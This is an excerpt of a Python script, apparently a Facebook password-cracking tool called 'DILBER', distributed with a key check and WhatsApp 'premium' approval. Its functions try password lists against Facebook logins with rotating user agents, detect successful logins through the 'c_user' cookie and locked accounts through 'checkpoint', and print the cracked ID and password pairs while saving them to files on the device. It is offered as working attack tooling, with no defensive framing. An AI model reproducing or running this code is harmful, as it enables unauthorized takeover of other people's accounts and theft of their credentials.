...
try:
	...
	os.system('python DILBER+Ali.py')
ugen = []
...
a=requests.get("https://github.com/DSKING1234/DSR/blob/main/txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    ...
    print
    print("Your key  : "+key2)
    print("Contact Admin Approved Your Command And Enjoy ")
    url_wa = "https://api.whatsapp.com/send?phone=+923232706058&text="
    tks = "hello admin, please confirm my key to premium :)\\"+"* key: "+key2
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> DILBER  VERSION :\x1b[1;92m 2.0 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/DILBER+Ali.txt')
				linex()
				...
				os.system(f'xdg-open https://www.facebook.com/groups/302474258349320/');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[DILBER] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in DILBER+Ali:
				print('\r\r\033[1;31m[DILBER-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/DILBER+Ali-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in DILBER+Ali:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[DILBER-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/DILBER+Ali-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[DILBER] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in DILBER+Ali:
				...
				print('\r\r\033[1;32m[DILBER-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[DILBER-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mDILBER\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			'scheme': 'https',
             ...
             'referer': 'https://free.facebook.com/?stype=lo&jlou=Afd4aWDEQ6ESIUuPO8mYS6gaborRwmIdtE93j9I3fGoQcjojUvhRHxW5q8ukJcMdKm4Pp-_vyVzIiZN7sLQnFuKIQkye-BbGVOu94OrEGHSmBg&smuh=32911&lh=Ac9JeZf71kttOzB0y1U&_rdr',
		   ...
		   'user-agent': ua}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[DILBER-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[DILBER-OK] '+cid+' | '+ps+'\33[0;97m')
